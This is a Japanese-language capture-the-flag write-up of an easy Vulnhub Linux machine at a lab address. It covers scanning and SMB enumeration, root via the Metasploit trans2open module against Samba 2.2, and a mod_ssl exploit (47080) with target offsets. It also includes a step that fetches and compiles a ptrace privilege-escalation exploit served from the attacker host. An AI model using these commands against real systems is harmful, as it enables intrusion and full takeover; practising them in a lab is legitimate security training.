## 1. Target Information（対象情報）
Machine : Linux

Platform : Vulnhub

Difficulty : Easy

Target IP : 192.168.56.4

Goal : root権限の取得

## 2. Reconnaissance（事前調査）
対象マシンのIPアドレスを特定
```bash
netdiscover -r 192.168.56.0/24
```
{% include image.html file="netdiscover.png" %}

## 3. Enumeration（列挙）

### 3.1 Port Scanning
公開されているポートとサービスの確認
```bash
nmap -Pn -sS -sV 192.168.56.4
```
{% include image.html file="nmap.png" %}

### 3.2 Directory Enumeration
ディレクトリ・サブドメイン探索の探索
```bash
gobuster dir -u http://192.168.56.4 -w /usr/share/wordlists/dirb/common.txt
```

### 3.3 Web Vulnerability Scanning
既知の脆弱性を調査
```bash
nikto -h http://192.168.56.4
```
{% include image.html file="nikto.png" %}

### 3.4 SMB Enumeration
SMBのバージョンを把握していないため、調査

Nmapによるバージョン調査
```bash
nmap -p139 -sV --version-all 192.168.56.4
```
{% include image.html file="nmap_version.png" %}

enum4linuxによるバージョン調査
```bash
enum4linux -a 192.168.56.4 | grep -iE "samba|version|server|os"
```
{% include image.html file="enum4linux.png" %}

MetasploitによるSMBバージョン調査
```bash
msfconsole
msf6 > search smb_version
msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > show options
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.4
msf6 auxiliary(scanner/smb/smb_version) > exploit
```
{% include image.html file="msf_smb_version.png" %}

以上によるバージョンの特定は出来なかった。
なのでwiresharkで通信を傍受してパケットの確認
```bash
smbclient -L 192.168.56.4 -p 139
```
{% include image.html file="wireshark.png" %}

## 5. Exploitation（攻撃・侵入）

### 5.1 samba 2.2
取得したExploitのコンパイル
```bash
gcc 10.c -o RCE
```
古くコンパイルの失敗
{% include image.html file="smb_compile_f.png" %}

Metasploit Frameworkを使用してSamba 2.2系のExploitの検索から実施
```bash
msfconsole 
search samba 2.2
use 2
set payload 29
set RHOSTS 192.168.56.4
set LHOST 192.168.56.3
exploit
```
{% include image.html file="trans2open.png" %}

侵入後権限の確認
```bash
whoami
root
```
{% include image.html file="trans2open_exploit.png" %}

### 5.2 mod_ssl 2.8.4
取得したExploitのコンパイルとターゲットの確認
```bash
gcc -o 47080 47080.c -lcrypto
./47080
```
{% include image.html file="apache_target.png" %}

0x6aでは失敗
```bash
./47080 0x6a 192.168.56.4
```
{% include image.html file="0x6a_f.png" %}

0x6bで成功
```bash
./47080 0x6b 192.168.56.4
```
{% include image.html file="0x6b_t.png" %}

対象マシンがインターネットに接続していないためhttpを建てる
```bash
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python3 -m http.server 8000
```
ダウンロードして実行し、root確認
```bash
wget http://192.168.56.3:8000/ptrace-kmod.c
gcc -o fuck ptrace-kmod.c
./fuck
```
{% include image.html file="ptrace_local.png" %}
